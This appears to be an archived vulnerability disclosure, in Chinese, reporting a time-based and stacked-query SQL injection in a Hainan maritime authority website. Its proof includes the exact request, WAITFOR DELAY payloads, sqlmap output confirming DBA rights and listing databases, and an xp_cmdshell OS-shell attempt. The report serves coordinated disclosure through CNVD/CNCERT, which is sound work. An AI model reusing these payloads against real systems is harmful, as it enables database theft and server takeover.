wybug_title: 海南海事局SQL注入#DBA权限#可获shell获取数据库全部信息
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail:
漏洞详情 披露状态：   									2015-12-03：	细节已通知厂商并且等待厂商处理中									2015-12-07：	厂商已经确认，细节仅向厂商公开									2015-12-17：	细节向核心白帽子及相关领域专家公开									2015-12-27：	细节向普通白帽子公开									2016-01-06：	细节向实习白帽子公开									2016-01-21：	细节向公众公开  简要描述： 如题、危害非常大 详细说明：  0x01 漏洞描述SQL注入漏洞，基于时间的盲注，DBA权限，可写shell，可获取服务器权限、获得全部数据0x02 漏洞网站
http://**.**.**.**
0x03 漏洞请求参数
POST /523/dirlist_1.aspx HTTP/1.1Content-Length: 158Content-Type: application/x-www-form-urlencodedX-Requested-With: XMLHttpRequestReferer: http://**.**.**.**:80/Cookie: ASP.NET_SessionId=h2d35mn1byrrc2yk5xhlutvy; BAIDUID=F15F213033B16562C74353BB6B29AC4C:FG=1; bdshare_firstime=1448766798894Host: **.**.**.**Connection: Keep-aliveAccept-Encoding: gzip,deflateUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21Accept: */*subSearch=%e5%bc%80%e5%a7%8b%e6%a3%80%e7%b4%a2&searchType=Title&searchValue=-1&searchYear=2015
注入关键字：searchValue   漏洞证明：  0x04 漏洞证明
---Place: POSTParameter: searchValue    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: subSearch=%e5%bc%80%e5%a7%8b%e6%a3%80%e7%b4%a2&searchType=Title&searchValue=-1'; WAITFOR DELAY '0:0:5'--&searchYear=2015    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: subSearch=%e5%bc%80%e5%a7%8b%e6%a3%80%e7%b4%a2&searchType=Title&searchValue=-1' WAITFOR DELAY '0:0:5'--&searchYear=2015---[02:44:54] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, ASP.NET 4.0.30319, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2008[03:45:42] [INFO] testing if current user is DBAcurrent user is DBA:    True
 数据库信息
available databases [6]:[*] [msdb][*] [tempdb][*] hnMSA[*] hnMSA2[*] master[*] model
0x05 获取os-shell

[03:38:03] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errors [03:38:03] [INFO] testing if xp_cmdshell extended procedure is usable[03:38:06] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'[03:38:06] [ERROR] unable to retrieve xp_cmdshell output[03:38:06] [INFO] going to use xp_cmdshell extended procedure for operating system command execution[03:38:06] [INFO] calling Windows OS shell. wybug_reply: 漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-07 14:04 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给海南分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
